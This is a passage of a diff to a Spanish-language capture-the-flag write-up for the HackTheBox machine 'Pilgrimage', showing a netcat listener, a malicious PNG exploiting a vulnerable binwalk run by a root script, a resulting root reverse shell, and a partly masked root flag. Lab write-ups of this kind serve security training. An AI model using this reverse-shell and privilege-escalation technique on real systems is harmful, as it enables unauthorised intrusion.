+Por otro lado, nos pondremos en escucha con `nc` para recibir la conexión.
 
 ```bash
 ❯ nc -nlvp 443
 listening on [any] 443 ...
 ```
 
-
+Desde el equipo comprometido, nos dirigiremos al directorio `/var/www/pilgrimage.htb/shrunk` para descargar la imagen maliciosa que estamos compartiendo desde nuestro servidor. Si todo funciona correctamente y el script que ejecuta `root` detecta este nuevo archivo, será analizado por el binario de `binwalk` y al ser una versión vulnerable, nos deberá proporcionar la Reverse Shell.
 
 ```bash
 emily@pilgrimage:~$ cd /var/www/pilgrimage.htb/shrunk/
@@ -1098,7 +1060,7 @@ total 556
 -rw-r--r-- 1 emily    emily    178080 Feb 18 11:42 binwalk_exploit.png
 ```
 
-
+Verificamos que finalmente ganamos acceso al sistema como usuario `root` y podemos visualizar la flag **root.txt**.
 
 ```bash
 ❯ nc -nlvp 443
@@ -1111,5 +1073,5 @@ whoami
 root
 root@pilgrimage:~/quarantine# cat /root/root.txt
 cat /root/root.txt
-a0c28ed79d164bcf46d678fea979686b
+a0c28ed79d164********************
 ```
